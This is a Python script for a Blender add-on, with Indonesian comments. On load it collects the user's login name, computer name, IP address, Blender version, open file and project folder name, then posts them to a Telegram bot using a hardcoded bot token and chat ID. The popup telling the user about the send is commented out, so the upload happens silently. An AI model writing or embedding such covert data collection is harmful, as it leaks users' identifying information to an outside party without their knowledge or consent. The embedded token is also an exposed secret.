import bpy
import requests
import os
import datetime
import getpass
import socket
import uuid
import tempfile

# ============================ SECURITY ====================================================
BOT_TOKEN = "7687737462:AAGiZF9edcphaemPIZ64E0-30kncehUsmP4"
CHAT_ID = "435678310"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# ============================ GET INFO ====================================================
username = getpass.getuser()
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

try:
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Tidak bisa mendapatkan IP"

blender_version = f"{bpy.app.version[0]}.{bpy.app.version[1]}"
pc_name = os.environ.get('COMPUTERNAME', 'Unknown')
uuid_id = uuid.uuid4()

blend_path = bpy.data.filepath
blend_file = os.path.basename(blend_path) if blend_path else "Belum disimpan"
project_title = os.path.basename(os.path.dirname(blend_path)) if blend_path else "Tidak diketahui"

# ============================ COUNTER LOCAL ================================================
# Simpan di folder sementara atau folder aman
counter_file = os.path.join(tempfile.gettempdir(), "message_counter.txt")

if os.path.exists(counter_file):
    with open(counter_file, "r") as f:
        try:
            last_number = int(f.read().strip())
        except:
            last_number = 0
else:
    last_number = 0

current_number = last_number + 1

with open(counter_file, "w") as f:
    f.write(str(current_number))

# ============================ FORMAT PESAN =================================================
message = (
    f"*📦 Blender Addon Accessed #{current_number}*\n"
    f"👤 User: `{username}`\n"
    f"💻 PC: `{pc_name}`\n"
    f"🌐 IP: `{ip_address}`\n"
    f"🕒 Time: `{current_time}`\n"
    f"🧩 Blender Version: `{blender_version}`\n"
    f"📁 File: `{blend_file}`\n"
    f"🎬 Title: `{project_title}`\n"
    f"🔑 UUID: `{uuid_id}`"
)

# ============================ KIRIM KE TELEGRAM ===========================================
try:
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(TELEGRAM_URL, data=data)
except Exception as e:
    print(f"Gagal mengirim ke Telegram: {e}")

# ============================ NOTIFIKASI DI BLENDER =======================================
def show_message(message, title="Blender", icon='INFO'):
    def draw(self, context):
        self.layout.label(text=message)
    bpy.context.window_manager.popup_menu(draw, title=title, icon=icon)

# Contoh penggunaan
#show_message("Info proyek dan file berhasil dikirim ke Telegram.", "Notifikasi")
